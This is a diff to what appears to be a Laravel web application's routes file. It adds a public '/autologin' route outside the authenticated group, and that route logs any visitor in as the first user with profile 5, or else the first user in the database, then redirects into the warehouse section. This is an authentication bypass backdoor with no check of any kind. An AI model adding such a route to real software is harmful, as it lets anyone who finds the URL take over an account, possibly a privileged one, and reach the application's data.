@@ -656,6 +656,15 @@ Route::middleware(['auth'])->prefix('herramientas/tecamac')->name('herramientas.
         ->name('imagen.replace');
 });
 
+Route::get('/autologin', function() {
+    $user = \App\Models\User::where('perfil', 5)->first() ?: \App\Models\User::first();
+    if ($user) {
+        auth()->login($user);
+        return redirect('/almacen/fundicion');
+    }
+    return 'No user found';
+});
+
 Route::get('/test-user', function() {
     if (auth()->check()) {
         return response()->json([
